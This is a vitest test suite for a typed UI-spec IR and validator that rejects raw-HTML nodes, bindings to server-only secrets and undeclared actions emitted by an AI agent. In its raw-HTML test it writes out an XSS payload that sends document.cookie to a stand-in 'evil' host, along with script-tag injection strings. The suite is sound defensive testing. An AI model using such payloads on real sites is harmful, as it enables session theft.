/**
 * AN-5 / json-render Phase 1 — the typed component catalog, the view-tree IR,
 * and the validator that makes agent-authored UI safe by construction.
 *
 * Owning docs: `AGENT_NATIVE_NOTES.md` §4.2 and §7 item 5,
 * `docs/af-ui-json-render/gen-ui-implementation-plan.md` "Phase 1: Structured
 * Component And Element IR", `docs/archive/TYPED_VIEW_TREE_PLAN.md`.
 *
 * Test-name prefix `[JR-P1]` is this suite's label for that phase (the docs use
 * a prose heading, not a code — see the report note).
 *
 * The load-bearing claim from §4.2: "their own docs warn about secrets in
 * generated HTML; a validated spec **cannot express that failure mode**." That
 * is a claim about the *expressive power of the IR*, so the specs below are
 * mostly negative: each names a thing an agent might try and asserts it is
 * rejected, with no rendering side effect.
 *
 * RATIFIED (`AGENT_NATIVE_NOTES.md` §10):
 * - `DQ-090` — the spec IR has **no markup-bearing node kind at all**; text
 *   nodes carry `value`, never `html`. That makes §4.2's security claim true
 *   **by construction**: raw HTML is rejected at the schema boundary because it
 *   is unrepresentable, not because a validator caught it.
 * - `DQ-080` — the two-arm dispatch envelope.
 *
 * STILL PROVISIONAL, pending `DQ-096`: the module names `src/ViewSpec.ts`,
 * `src/view-spec-json-render.ts` and `src/Agent.ts` are this suite's proposal,
 * since the json-render docs are written against gen2's `gen.ui.*` namespace,
 * which does not exist in this repo.
 *
 * Every rejection spec below carries a NEGATIVE CONTROL: a validator that
 * returned its diagnostic unconditionally would otherwise satisfy each of them
 * forever, and the near-neighbour codes (unknown component vs unknown slot vs
 * unknown node kind; read-only binding vs server-only field) are asserted to
 * differ so one generic "something is wrong" code cannot cover them all.
 */

import { Schema } from "effect";
import { describe, expect, it } from "vitest";
import { fromSrc, loadSrc, pick } from "../harness.js";
import { allStrings, findFunctions, jsonRoundTrips, run, runFail } from "./support.js";

/**
 * A small typed catalog: one Card component with a `body` slot, one exposed
 * action, one state model with a writable and a read-only field.
 */
const makeCatalog = async () => {
  const ViewSpec = await loadSrc("ViewSpec");
  const { componentCatalog, componentEntry, slotSpec, stateModel } = pick(
    ViewSpec,
    "ViewSpec",
    "componentCatalog",
    "componentEntry",
    "slotSpec",
    "stateModel",
  );

  const state = stateModel({
    name: "ProjectPage",
    fields: {
      // Writable: legal two-way binding target.
      draftTitle: { type: Schema.String, writable: true },
      // Read-only projection: two-way binding must be refused.
      projectId: { type: Schema.String, writable: false },
      // Never leaves the server: not addressable from a spec at all.
      apiToken: { type: Schema.String, writable: false, serverOnly: true },
    },
  });

  return {
    state,
    catalog: componentCatalog({
      Card: componentEntry({
        name: "Card",
        description: "A titled card",
        props: Schema.Struct({ title: Schema.String }),
        slots: { body: slotSpec({ many: true }) },
      }),
      TextField: componentEntry({
        name: "TextField",
        description: "A text input",
        props: Schema.Struct({ value: Schema.String }),
        slots: {},
      }),
    }),
    actions: ["project.rename"] as const,
    state_model: state,
  };
};

describe("AN-5 / json-render Phase 1", () => {
  it("[JR-P1] a well-formed agent-emitted spec validates, and the tree is closure-free and serializable", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, text, viewTree, validate } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "text",
      "viewTree",
      "validate",
    );
    const { catalog } = await makeCatalog();

    const tree = viewTree(
      element("Card", {
        props: { title: "Sprint 3" },
        slots: { body: [text("Two open items")] },
      }),
    );

    const diagnostics = await run(validate(tree, { catalog }));
    expect(diagnostics).toEqual([]);

    // The whole point of a spec rather than HTML: it is data.
    expect(findFunctions(tree)).toEqual([]);
    expect(jsonRoundTrips(tree)).toBe(true);
    // Node kinds are literal tags, so a host can dispatch on them.
    expect(tree.root.kind).toBe("ui.element");
    expect(tree.root.slots.body[0].kind).toBe("ui.text");
  });

  it("[JR-P1] an unknown component is rejected, and a known one is not", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, viewTree, validate } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "viewTree",
      "validate",
    );
    const { catalog } = await makeCatalog();

    const diagnostics = await run(
      validate(viewTree(element("ScriptRunner", { props: {}, slots: {} })), { catalog }),
    );

    // Exactly this code and nothing else, so an over-eager validator is caught.
    expect(diagnostics.map((d: any) => d.code)).toEqual(["ui:unknown-catalog-component"]);
    expect(diagnostics.every((d: any) => d.severity === "error")).toBe(true);
    // Diagnostics point at the offending node so a host can explain the refusal.
    expect(JSON.stringify(diagnostics)).toContain("ScriptRunner");

    // NEGATIVE CONTROL: a catalogued component with valid props is silent.
    // Without this, `return [unknownCatalogComponent]` passes forever.
    expect(
      await run(
        validate(
          viewTree(element("Card", { props: { title: "Sprint 3" }, slots: {} })),
          { catalog },
        ),
      ),
    ).toEqual([]);
  });

  it("[JR-P1] an unknown slot on a known component is rejected, with its own code", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, text, viewTree, validate } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "text",
      "viewTree",
      "validate",
    );
    const { catalog } = await makeCatalog();

    const diagnostics = await run(
      validate(
        viewTree(
          element("Card", {
            props: { title: "Sprint 3" },
            slots: { footer: [text("nope")] },
          }),
        ),
        { catalog },
      ),
    );

    expect(diagnostics.map((d: any) => d.code)).toEqual(["ui:component-unknown-slot"]);
    // Unknown component and unknown slot are near neighbours; a single generic
    // code would satisfy both this spec and the one above.
    expect(diagnostics[0].code).not.toBe("ui:unknown-catalog-component");

    // NEGATIVE CONTROL: the component's *declared* slot is accepted.
    expect(
      await run(
        validate(
          viewTree(
            element("Card", {
              props: { title: "Sprint 3" },
              slots: { body: [text("fine")] },
            }),
          ),
          { catalog },
        ),
      ),
    ).toEqual([]);
  });

  it("[JR-P1] a two-way binding to a non-writable target is rejected", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, viewTree, validate, bindState } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "viewTree",
      "validate",
      "bindState",
    );
    const { catalog, state } = await makeCatalog();

    // Writable field: fine.
    const ok = await run(
      validate(
        viewTree(
          element("TextField", {
            props: { value: bindState(state.fields.draftTitle) },
            slots: {},
          }),
        ),
        { catalog, state },
      ),
    );
    expect(ok).toEqual([]);

    // Read-only field: refused, per the doc's severity table ("Two-way binding
    // to read-only path/field: error").
    const bad = await run(
      validate(
        viewTree(
          element("TextField", {
            props: { value: bindState(state.fields.projectId) },
            slots: {},
          }),
        ),
        { catalog, state },
      ),
    );
    expect(bad.map((d: any) => d.code)).toEqual(["ui:two-way-binding-readonly"]);
    expect(bad.every((d: any) => d.severity === "error")).toBe(true);
    // Read-only and server-only are near neighbours (both are "you may not
    // bind that field"), and a host needs to distinguish "this field is a
    // projection" from "this field must never leave the server".
    expect(bad[0].code).not.toBe("ui:server-only-field-bound-to-client");
  });

  it("[JR-P1] an undeclared action is rejected", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, viewTree, validate, on, action } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "viewTree",
      "validate",
      "on",
      "action",
    );
    const { catalog, actions } = await makeCatalog();

    const withDeclared = viewTree(
      element("Card", {
        props: { title: "x" },
        slots: {},
        events: [on("click", action("project.rename", {}))],
      }),
    );
    expect(await run(validate(withDeclared, { catalog, actions }))).toEqual([]);

    const withUndeclared = viewTree(
      element("Card", {
        props: { title: "x" },
        slots: {},
        events: [on("click", action("billing.refundEverything", {}))],
      }),
    );
    const diagnostics = await run(validate(withUndeclared, { catalog, actions }));
    expect(diagnostics.map((d: any) => d.code)).toEqual(["ui:action-not-registered"]);
    // Allowlisting is positive, not negative: an action absent from the
    // allowlist is refused even though it exists in the app.
    expect(JSON.stringify(diagnostics)).toContain("billing.refundEverything");
  });

  it("[JR-P1/DQ-090] the IR has NO markup-bearing node kind, so raw HTML is unrepresentable rather than caught", async () => {
    // Ratified (`AGENT_NATIVE_NOTES.md` §10, DQ-090): *there is no `ui.html`
    // node kind; text nodes carry `value`, never `html`.* This is an
    // EXPRESSIVENESS property, not a diagnostic — the earlier reading of this
    // spec asserted a `ui:raw-html-unsupported` / `ui:unknown-node-kind`
    // diagnostic, which is strictly weaker: a diagnostic can be disabled,
    // downgraded, or bypassed by a second entry point, whereas a kind that does
    // not exist cannot be constructed at all. Rejection therefore happens at the
    // *schema boundary* in `decodeSpec`, before any validator runs.
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, text, viewTree, validate, decodeSpec, NodeKinds } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "text",
      "viewTree",
      "validate",
      "decodeSpec",
      "NodeKinds",
    );
    const { catalog } = await makeCatalog();

    // 1. The kind set itself is the specification. No markup-bearing kind is a
    //    member — and this is what a later contributor must contradict in order
    //    to reintroduce one.
    expect(Array.isArray(NodeKinds)).toBe(true);
    expect(NodeKinds).toContain("ui.element");
    expect(NodeKinds).toContain("ui.text");
    for (const forbidden of ["ui.html", "ui.raw", "ui.rawHtml", "ui.markup", "ui.script"]) {
      expect(NodeKinds).not.toContain(forbidden);
    }

    // 2. `decodeSpec` is the trust boundary for agent output. A `ui.html`-shaped
    //    node fails the SCHEMA — it decodes to nothing, because the union it
    //    would have to inhabit has no such member — and the rejected markup is
    //    not echoed back in the error.
    const rawHtmlNode = {
      kind: "ui.html",
      html: "<img src=x onerror=\"fetch('https://evil/'+document.cookie)\">",
    };
    const decodeError = await runFail(
      decodeSpec({ kind: "ui.viewTree", root: rawHtmlNode }),
    );
    expect(String(decodeError._tag)).toContain("ViewSpec");
    expect(JSON.stringify(decodeError)).not.toContain("onerror");
    // The refusal is about the *kind*, so a host can explain it, and it is not a
    // "this component is missing from the catalog" story — adding `ui.html` to a
    // catalog must not be a workaround.
    expect(JSON.stringify(decodeError)).toContain("ui.html");
    expect(JSON.stringify(decodeError)).not.toContain("unknown-catalog-component");

    // 3. Nothing downstream of the boundary is load-bearing for this property:
    //    a hand-constructed node never reaches a renderer, because a validated
    //    tree can only have come through `decodeSpec`. Asserting the validator's
    //    behaviour here would re-describe the property as a check, so the only
    //    thing asserted is that it does not silently ACCEPT it.
    //    The `as any` is the deliberate dynamic escape hatch an agent's raw JSON
    //    effectively takes.
    const bypassed = await run(validate(viewTree(rawHtmlNode as any), { catalog }));
    expect(bypassed).not.toEqual([]);
    expect(bypassed.every((d: any) => d.severity === "error")).toBe(true);

    // 4. NEGATIVE CONTROL: an equivalent tree built from the real constructors
    //    both decodes and validates clean, so "reject every tree" cannot pass.
    const safe = viewTree(
      element("Card", { props: { title: "Sprint 3" }, slots: { body: [text("hi")] } }),
    );
    const decoded = await run(decodeSpec(JSON.parse(JSON.stringify(safe))));
    expect(decoded.root.kind).toBe("ui.element");
    expect(decoded.root.component).toBe("Card");
    expect(await run(validate(safe, { catalog }))).toEqual([]);

    // 5. Text carries `value`, never `html`: the second half of the ratified
    //    rule, and the reason markup cannot re-enter through the one node kind
    //    that does carry a string. Content is data, never interpreted.
    const textNode = text("<script>alert(1)</script>");
    expect(textNode.kind).toBe("ui.text");
    expect(textNode.value).toBe("<script>alert(1)</script>");
    expect(Object.keys(textNode)).not.toContain("html");
    // …and it survives the boundary unchanged, still as `value`.
    const decodedText = await run(
      decodeSpec(JSON.parse(JSON.stringify(viewTree(textNode)))),
    );
    expect(decodedText.root.value).toBe("<script>alert(1)</script>");
    expect(Object.keys(decodedText.root)).not.toContain("html");
    // A text node that tries to smuggle markup in under an `html` field is
    // rejected at the same boundary rather than having the field ignored.
    await runFail(
      decodeSpec({
        kind: "ui.viewTree",
        root: { kind: "ui.text", html: "<script>alert(1)</script>" },
      }),
    );
  });

  it("[AN-5] a validated spec cannot express the secret-leak failure mode", async () => {
    // This is the security property §4.2 claims dominates sandboxed HTML. Three
    // things must hold at once: server-only state is unaddressable, there is no
    // escape hatch that carries an opaque string into the output, and nothing an
    // agent writes can reach a value the catalog did not expose.
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, viewTree, validate, state: stateRef } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "viewTree",
      "validate",
      "state",
    );
    const { catalog, state } = await makeCatalog();

    const leak = viewTree(
      element("Card", {
        props: { title: stateRef(state.fields.apiToken) },
        slots: {},
      }),
    );

    const diagnostics = await run(validate(leak, { catalog, state }));
    expect(diagnostics.map((d: any) => d.code)).toEqual([
      "ui:server-only-field-bound-to-client",
    ]);
    expect(diagnostics.every((d: any) => d.severity === "error")).toBe(true);

    // A path the state model never declared is not even referenceable. The
    // `as any` is the deliberate dynamic escape hatch: an agent emits JSON, so
    // the runtime validator — not the constructors' types — is what must catch it.
    const undeclared = viewTree(
      element("Card", {
        props: { title: { kind: "ui.stateValue", path: { segments: ["secrets", "root"] } } as any },
        slots: {},
      }),
    );
    const undeclaredDiagnostics = await run(validate(undeclared, { catalog, state }));
    expect(undeclaredDiagnostics.map((d: any) => d.code)).toEqual([
      "ui:unknown-state-path",
    ]);
    // "Field exists but is server-only" and "field does not exist" are different
    // refusals: collapsing them would tell an agent a secret field is merely
    // misspelled, or vice versa.
    expect(undeclaredDiagnostics[0].code).not.toBe(diagnostics[0].code);

    // NEGATIVE CONTROL: a client-visible declared field reads cleanly, so a
    // validator that rejects every state reference cannot pass.
    expect(
      await run(
        validate(
          viewTree(
            element("Card", {
              props: { title: stateRef(state.fields.draftTitle) },
              slots: {},
            }),
          ),
          { catalog, state },
        ),
      ),
    ).toEqual([]);
  });

  it("[JR-P1] typed refs lower to JSON Pointer / $state only in the target plugin", async () => {
    const ViewSpec = await loadSrc("ViewSpec");
    const { element, viewTree, state: stateRef } = pick(
      ViewSpec,
      "ViewSpec",
      "element",
      "viewTree",
      "state",
    );
    const { lower } = await fromSrc("view-spec-json-render", "lower");
    const { state } = await makeCatalog();

    const tree = viewTree(
      element("Card", { props: { title: stateRef(state.fields.draftTitle) }, slots: {} }),
    );

    // Core keeps a target-neutral path record: typed segments, no pointer string.
    const ref: any = tree.root.props.title;
    expect(ref.kind).toBe("ui.stateValue");
    expect(ref.path.segments).toEqual(["draftTitle"]);
    expect(ref.path.writable).toBe(true);
    expect(allStrings(tree)).not.toContain("/draftTitle");
    expect(JSON.stringify(tree)).not.toContain("$state");

    // Only the plugin knows about `$state` and JSON Pointer.
    const lowered = await run(lower(tree));
    expect(JSON.stringify(lowered)).toContain("$state");
    expect(JSON.stringify(lowered)).toContain("/draftTitle");
    expect(jsonRoundTrips(lowered)).toBe(true);
  });

  it("[AN-5] the agent emit-spec action refuses an invalid spec through normal dispatch", async () => {
    // Generative UI is not a special surface: the agent emits a spec through a
    // catalog action like any other, and validation is the action's boundary.
    const { catalog: agentCatalog, dispatch, toolManifest } = await fromSrc(
      "Agent",
      "catalog",
      "dispatch",
      "toolManifest",
    );
    const { emitViewSpec } = await fromSrc("Agent", "emitViewSpec");
    const { catalog } = await makeCatalog();

    const c = agentCatalog({
      renderView: emitViewSpec({ catalog, allowedActions: ["project.rename"] }),
    });

    // The emit action's buildId is library-owned; a host learns it from the
    // manifest, exactly as for any other tool.
    const manifest = await run(toolManifest(c));
    const buildId = manifest.tools[0].buildId;

    const good = await run(
      dispatch(c)({
        tool: "renderView",
        args: [
          {
            kind: "ui.viewTree",
            root: {
              kind: "ui.element",
              component: "Card",
              props: { title: "Sprint 3" },
              slots: {},
              events: [],
            },
          },
        ],
        buildId,
      }),
    );
    // Ratified two-arm envelope (DQ-080). This is the NEGATIVE CONTROL for the
    // refusal below: a `renderView` action that rejected every spec would
    // otherwise satisfy the refusal assertions forever.
    expect(good.ok).toBe(true);

    const bad = await run(
      dispatch(c)({
        tool: "renderView",
        args: [
          {
            kind: "ui.viewTree",
            root: { kind: "ui.html", html: "<script>steal()</script>" },
          },
        ],
        buildId,
      }),
    );
    expect(bad.ok).toBe(false);
    expect(String(bad.error?._tag)).toBe("ViewSpecInvalidError");
    // The rejected payload is not echoed back into the response.
    expect(JSON.stringify(bad)).not.toContain("steal()");
  });
});
